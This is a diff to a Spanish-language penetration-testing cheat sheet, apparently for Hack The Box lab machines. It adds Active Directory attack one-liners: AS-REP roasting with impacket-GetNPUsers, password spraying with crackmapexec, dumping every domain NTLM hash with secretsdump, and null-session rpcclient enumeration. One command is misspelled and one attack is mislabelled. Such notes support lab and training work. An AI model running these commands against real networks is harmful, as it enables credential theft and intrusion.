@@ -131,6 +131,7 @@ ldapsearch -x -H ldap://10.10.10.169 -D '' -w '' -b "DC=megabank,DC=local"  | gr
 ### ENUMERAR USUARIOS/PASSWD WINDOWS
 ```
 impacket-GetNPUsers.py active.htb/ -dc-ip 10.10.10.100 -request ---> kerberoasting, tienes una lista de usuarios y sacas la contraseña
+impacket-GetNPUsers.py active.htb/ -no-pass -usersfile ---> igual que el de arriba
 crackmapexec smb 10.10.10.161 --users  --> saca usuarios de esa ip
 crackmapexec smb 10.10.10.169 -u ./users -p password --no-bruteforce ---> te comprueba una lista de usuarios contra una lista de passwd
 crackmapexec smb 10.10.10.169 -u ./users -p Welcome123! --no-bruteforce ---> te comprueba una lista de usuarios contra un passwd en concreto
@@ -143,6 +144,15 @@ sudo impacket-smbserver share ./ ---> Te transfiere los archivos del directorio 
 impacket-GetNPUsers.py active.htb/ -dc-ip 10.10.10.100 -request ---> kerberoasting, tienes una lista de usuarios y sacas la contraseña
 
 impacket-secretsdump htb/svc-alfresco@10.10.10.161 ---> te saca los hashes NTLM de todos los usuarios del dominio
+
+```
+### DC-ENUMERACION USUARIOS 
+```
+rpcclient -U "" IP -N
+enumdomusers
+enumdomgroups
+querygrouomem 0x200 ---> 0x200 es el grupo admin, esto te dira que usuarios estan dentro de ese grupo
+queryuser 0x1f4 ---> te dice que usuario es el 0x1f4, en este caso el admin
 
 ```
 ### NMAP
